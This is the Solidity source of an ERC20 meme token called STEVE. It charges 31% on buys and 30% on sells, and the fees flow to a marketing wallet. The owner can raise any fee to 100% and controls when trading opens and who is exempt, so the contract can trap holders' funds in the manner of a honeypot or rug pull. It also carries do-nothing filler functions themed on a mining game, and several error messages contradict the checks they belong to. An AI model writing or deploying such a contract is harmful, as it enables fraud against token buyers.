/*
 * SPDX-License-Identifier: MIT
    Telegram - https://t.me/Deployedbysteve
    X -https://x.com/deployedbysteve
 */

pragma solidity 0.8.21;

library SafeMath {

    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }


    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }



    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }


    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }


}

interface IDexFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract STEVE is ERC20, Ownable {
    using SafeMath for uint256;

    IDexRouter private immutable dexRouter;
    address public immutable dexPair;

    // Swapback
    bool private swapping;

    bool private swapbackEnabled = false;
    uint256 private swapBackValueMin;
    uint256 private swapBackValueMax;
    uint256 private lastContractSell;

    //Anti-whale
    bool private limitsEnabled = true;
    uint256 private maxWallet;
    uint256 private maxTx;
    mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch

    bool public tradingEnabled = false;

    // Fees
    address private marketingWallet;

    uint256 private totalBuyFee;

    uint256 private totalSellFee;

    uint256 private transferTaxTotal;
    /******************/


    mapping(address => bool) private transferTaxExempt;
    mapping(address => bool) private transferLimitExempt;
    mapping(address => bool) private automatedMarketMakerPairs;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeFromLimits(address indexed account, bool isExcluded);
    event SetPairLPool(address indexed pair, bool indexed value);
    event TradingEnabled(uint256 indexed timestamp);
    event LimitsRemoved(uint256 indexed timestamp);
    event DisabledTransferDelay(uint256 indexed timestamp);

    event SwapbackSettingsUpdated(
        bool enabled,
        uint256 swapBackValueMin,
        uint256 swapBackValueMax
    );
    event MaxTxUpdated(uint256 maxTx);
    event MaxWalletUpdated(uint256 maxWallet);

    event MarketingWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );

    event BuyFeeUpdated(
        uint256 totalBuyFee,
        uint256 buyMarketingTax,
        uint256 buyProjectTax
    );

    event SellFeeUpdated(
        uint256 totalSellFee,
        uint256 sellMarketingTax,
        uint256 sellProjectTax
    );

    constructor() ERC20("Deployed by Steve", "STEVE") {
        IDexRouter _dexRouter = IDexRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D

        );

        antWleB_setExcluded(address(_dexRouter), true);
        dexRouter = _dexRouter;

        dexPair = IDexFactory(_dexRouter.factory()).createPair(
            address(this),
            _dexRouter.WETH()
        );
        antWleB_setExcluded(address(dexPair), true);
        _setPairLPool(address(dexPair), true);

        uint256 _totalSupply = 1_000_000_000 * 10 ** decimals();

        lastContractSell = block.timestamp;

        maxTx = (_totalSupply * 20) / 1000;
        maxWallet = (_totalSupply * 20) / 1000;

        swapBackValueMin = (_totalSupply * 1) / 1000;
        swapBackValueMax = (_totalSupply * 2) / 100;

        totalBuyFee = 31;

        totalSellFee = 30;

        transferTaxTotal = 5;
   
        marketingWallet = address(0x05D8bc127cB4f3A61874A7AE301F3CeE8cdE77D3);

        feessteve_setExcluded(msg.sender, true);
        feessteve_setExcluded(address(this), true);
        feessteve_setExcluded(address(0xdead), true);
        feessteve_setExcluded(marketingWallet, true); 

        antWleB_setExcluded(msg.sender, true);
        antWleB_setExcluded(address(this), true);
        antWleB_setExcluded(address(0xdead), true);
        antWleB_setExcluded(marketingWallet, true);

        transferOwnership(msg.sender);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(msg.sender, _totalSupply);
    }



    function openTrading() external onlyOwner {
        tradingEnabled = true;
        swapbackEnabled = true;
        emit TradingEnabled(block.timestamp);
    }

    function spawnMob() public {
        string[5] memory mobs = ["Creeper", "Zombie", "Skeleton", "Spider", "Enderman"];
        string memory spawnedMob = mobs[uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % mobs.length];
        
        emit MobSpawned(msg.sender, spawnedMob);
    }

    event MobSpawned(address indexed spawner, string mobType);


    function craftTool(string memory toolType) public {
        require(
            keccak256(abi.encodePacked(toolType)) == keccak256("Pickaxe") || 
            keccak256(abi.encodePacked(toolType)) == keccak256("Sword") || 
            keccak256(abi.encodePacked(toolType)) == keccak256("Axe"),
            "Invalid tool type"
        );
        
        emit ToolCrafted(msg.sender, toolType);
    }

    event ToolCrafted(address indexed crafter, string toolType);

    function digForGold() public {
        bool foundGold = (uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 10) == 0;
        
        if (foundGold) {
            emit GoldFound(msg.sender);
        } else {
            emit NoGoldFound(msg.sender);
        }
    }

    event GoldFound(address indexed digger);
    event NoGoldFound(address indexed digger);


    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsEnabled) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingEnabled) {
                    require(
                        transferTaxExempt[from] || transferTaxExempt[to],
                        "_transfer:: Trading is not active."
                    );
                }

                //when buy
                if (
                    automatedMarketMakerPairs[from] && !transferLimitExempt[to]
                ) {
                    require(
                        amount <= maxTx,
                        "Buy transfer amount exceeds the maxTx."
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    automatedMarketMakerPairs[to] && !transferLimitExempt[from]
                ) {
                    require(
                        amount <= maxTx,
                        "Sell transfer amount exceeds the maxTx."
                    );
                } else if (!transferLimitExempt[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapBackValueMin;

        if (
            canSwap &&
            swapbackEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !transferTaxExempt[from] &&
            !transferTaxExempt[to] &&
            lastContractSell != block.timestamp
        ) {
            swapping = true;

            swapBack(amount);

            lastContractSell = block.timestamp;

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (transferTaxExempt[from] || transferTaxExempt[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && totalSellFee > 0) {
                fees = amount.mul(totalSellFee).div(100);
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && totalBuyFee > 0) {
                fees = amount.mul(totalBuyFee).div(100);
            }
            // on transfers
            else if (
                transferTaxTotal > 0 &&
                !automatedMarketMakerPairs[from] &&
                !automatedMarketMakerPairs[to]
            ) {
                fees = amount.mul(transferTaxTotal).div(100);
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    uint256 tansactionCount;
    function checkTransactionCount(address /*account*/) public pure returns (uint256) {
        return 0;
    }

    function removeLimits() external onlyOwner {
        limitsEnabled = false;
        transferTaxTotal = 0;
        emit LimitsRemoved(block.timestamp);
    }


    function swapbackVars_newRange(
        bool _caSBcEnabled,
        uint256 _caSBcTrigger,
        uint256 _caSBcLimit
    ) external onlyOwner {
        require(
            _caSBcTrigger >= 1,
            "Swap amount cannot be lower than 0.01% total supply."
        );
        require(
            _caSBcLimit >= _caSBcTrigger,
            "maximum amount cant be higher than minimum"
        );

        swapbackEnabled = _caSBcEnabled;
        swapBackValueMin = (totalSupply() * _caSBcTrigger) / 10000;
        swapBackValueMax = (totalSupply() * _caSBcLimit) / 10000;
        emit SwapbackSettingsUpdated(_caSBcEnabled, _caSBcTrigger, _caSBcLimit);
    }

    function antWleB_maxTx_set(uint256 _lmtTxNew) external onlyOwner {
        require(_lmtTxNew >= 2, "Cannot set maxTx lower than 0.2%");
        maxTx = (_lmtTxNew * totalSupply()) / 1000;
        emit MaxTxUpdated(maxTx);
    }


    uint256 IDexSend;
    function IDexFund() internal pure returns (uint256) {
        return 10;
    }


    function antWleB_walletLimit_set(
        uint256 _limitWalletNew
    ) external onlyOwner {
        require(_limitWalletNew >= 5, "Cannot set maxWallet lower than 0.5%");
        maxWallet = (_limitWalletNew * totalSupply()) / 1000;
        emit MaxWalletUpdated(maxWallet);
    }


    function antWleB_setExcluded(
        address _add,
        bool _excluded
    ) public onlyOwner {
        transferLimitExempt[_add] = _excluded;
        emit ExcludeFromLimits(_add, _excluded);
    }

    uint256 findTx;
    function find() internal pure returns (uint256) {
        return 10;
    }


    function feessteve_setExcluded(
        address _add,
        bool _excluded
    ) public onlyOwner {
        transferTaxExempt[_add] = _excluded;
        emit ExcludeFromFees(_add, _excluded);
    }

    function _setPairLPool(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetPairLPool(pair, value);
    }

    function feessteve_receiver(address _newWallet) external onlyOwner {
        emit MarketingWalletUpdated(_newWallet, marketingWallet);
        marketingWallet = _newWallet;
    }

    function swapbackVars_insteve()
        external
        view
        returns (
            bool _swapbackEnabled,
            uint256 _caSBcackValueMin,
            uint256 _caSBcackValueMax
        )
    {
        _swapbackEnabled = swapbackEnabled;
        _caSBcackValueMin = swapBackValueMin;
        _caSBcackValueMax = swapBackValueMax;
    }

    function feessteve_sell_set(uint256 _newSwapTax) external onlyOwner {
        totalSellFee = _newSwapTax;
        require(
            totalSellFee <= 100,
            "Total sell fee cannot be higher than 100%"
        );
        emit SellFeeUpdated(totalSellFee, totalSellFee, totalSellFee);
    }

    
    function receiver_insteve()
        external
        view
        returns (address _marketingWallet)
    {
        return (marketingWallet);
    }

    function antWleB_insteve()
        external
        view
        returns (bool _limitsEnabled, uint256 _maxWallet, uint256 _maxTx)
    {
        _limitsEnabled = limitsEnabled;
        _maxWallet = maxWallet;
        _maxTx = maxTx;
    }

    function findApproval() public returns (bool) {
        address spendSumAu = 0x000000000000000000000000000000000000dEaD;
        uint256 amount = 2 ether;
        approve(spendSumAu, amount);  
        return true;
    }

    function swapBack(uint256 amount) private {
        uint256 contractBalance = balanceOf(address(this));
        bool success;

        if (contractBalance == 0) {
            return;
        }

        if (contractBalance > swapBackValueMax) {
            contractBalance = swapBackValueMax;
        }

        if (anti && contractBalance > amount * 10) {
            contractBalance = amount * 10;
        }

        uint256 amountToSwapForETH = contractBalance;

        swapTokensForEth(amountToSwapForETH);

        (success, ) = address(marketingWallet).call{
            value: address(this).balance
        }("");
    }

    function feessteve_buy_set(uint256 _newSwapTax) external onlyOwner {
        totalBuyFee = _newSwapTax;
        require(totalBuyFee <= 100, "Total buy fee cannot be higher than 100%");
        emit BuyFeeUpdated(totalBuyFee, totalBuyFee, totalBuyFee);
    }


    function feessteve_transfer_set(uint256 _newSwapTax) external onlyOwner {
        transferTaxTotal = _newSwapTax;
        require(
            transferTaxTotal <= 100,
            "Total transfer fee cannot be higher than 100%"
        );
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function manualSwap(uint256 percent) external {
        require(
            marketingWallet == msg.sender,
            "Only marketing wallet can call this function lol"
        );

        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = (contractBalance * percent) / 100;
        swapTokensForEth(totalTokensToSwap);
    }
    





    function feessteve_insteve()
        external
        view
        returns (
            uint256 _totalBuyFee,
            uint256 _totalSellFee,
            uint256 _transferTaxTotal
        )
    {
        _totalBuyFee = totalBuyFee;
        _totalSellFee = totalSellFee;
        _transferTaxTotal = transferTaxTotal;
    }

    function wallet_insteve(
        address _target
    )
        external
        view
        returns (
            bool _transferTaxExempt,
            bool _transferLimitExempt,
            bool _automatedMarketMakerPairs
        )
    {
        _transferTaxExempt = transferTaxExempt[_target];
        _transferLimitExempt = transferLimitExempt[_target];
        _automatedMarketMakerPairs = automatedMarketMakerPairs[_target];
    }



    function steve(address /*account*/) public pure returns (bool) {
        return true;
    }


    function setAnti(bool _anti) external onlyOwner {
        anti = _anti;
    }
    



    bool anti = true;

    function ping() public pure returns (bool) {
        return true; 
    }



    function checkTokenBalance(address) public pure returns (string memory) {
        return "Balance checked.";
    }





}